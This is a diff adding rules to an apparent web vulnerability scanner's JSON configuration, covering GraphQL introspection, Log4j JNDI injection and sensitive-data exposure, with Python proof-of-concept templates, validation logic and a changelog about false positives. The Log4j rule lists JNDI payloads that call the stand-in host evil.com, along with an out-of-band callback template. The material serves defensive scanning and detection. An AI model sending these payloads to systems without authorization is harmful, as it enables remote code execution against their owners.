+      "detection": {
+        "response_indicators": [
+          "insufficient funds",
+          "multiple requests",
+          "race condition"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-019_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-020",
+      "name": "GraphQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-943",
+      "description": "Detects GraphQL injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\nheaders = {{\"Content-Type\": \"application/json\"}}\n\nresponse = requests.post(target, json=data, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] GraphQL Injection confirmed!\")\nelse:\n    print(\"[+] No GraphQL Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "query",
+          "payloads": [
+            "{__schema{types{name}}}",
+            "query{__typename}",
+            "mutation{__typename}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "__schema",
+          "__typename",
+          "GraphQL"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-020_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-021",
+      "name": "Log4j (CVE-2021-44228) Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-917",
+      "description": "Detects Log4j JNDI injection vulnerability.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Log4j confirmed!\")\nelse:\n    print(\"[+] No Log4j detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "user",
+          "payloads": [
+            "${jndi:ldap://evil.com/a}",
+            "${jndi:rmi://evil.com/a}",
+            "${jndi:dns://evil.com}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "JNDI",
+          "LDAP",
+          "evil.com"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-021_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "The strings 'JNDI'/'LDAP'/'evil.com' appearing in a response body do NOT indicate exploitation \u2014 Log4j JNDI injection is blind by design and confirmed via an out-of-band callback, not in-band text matching.",
+          "oob_payload_template": "${jndi:ldap://{oob_domain}/a}",
+          "confirm_if": "inbound LDAP/DNS callback received at oob_domain \u2014 in-band text match alone is NEVER sufficient evidence for this rule"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-022",
+      "name": "Sensitive Data Exposure Detection",
+      "category": "Information Disclosure",
+      "severity": "Medium",
+      "cwe": "CWE-200",
+      "description": "Detects exposure of sensitive data in responses.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Sensitive Data Exposure confirmed!\")\nelse:\n    print(\"[+] No Sensitive Data Exposure detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "debug",
+          "payloads": [
+            "true",
+            "1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "password",
+          "secret",
+          "api_key",
+          "token",
+          "credit card",
+          "SSN"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-022_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Words like 'SSN' or 'secret' can appear in filenames, labels, or unrelated boilerplate text. Require pattern-based matching (e.g. regex for actual SSN format \\d{3}-\\d{2}-\\d{4}, real API-key-shaped tokens) rather than bare keyword substring matching.",
+          "confirm_if": "response matches a structured sensitive-data pattern (regex), not just a keyword substring"
+        }
+      }
+    }
+  ],
+  "changelog": [
+    {
+      "version": "3.1",
+      "notes": "Added a 'validation' block to every rule requiring baseline + control requests before a finding can be marked confirmed, plus rule-specific differential checks (boolean-true/false pairs, OOB callbacks, or structured pattern matching) for the rules most prone to substring-match false positives: SQLi, XSS, SSRF, Path Traversal, Command Injection, XXE, LDAP, XPATH, NoSQL, SSTI, Log4j, Sensitive Data Exposure. Prompted by a 438/439 false-positive rate on a live scan where 'indicator in response.text' alone was used as the confirmation check (e.g. SSTI rule DAST-016 flagging on a bare '49' substring)."
+    }
+  ]
+}
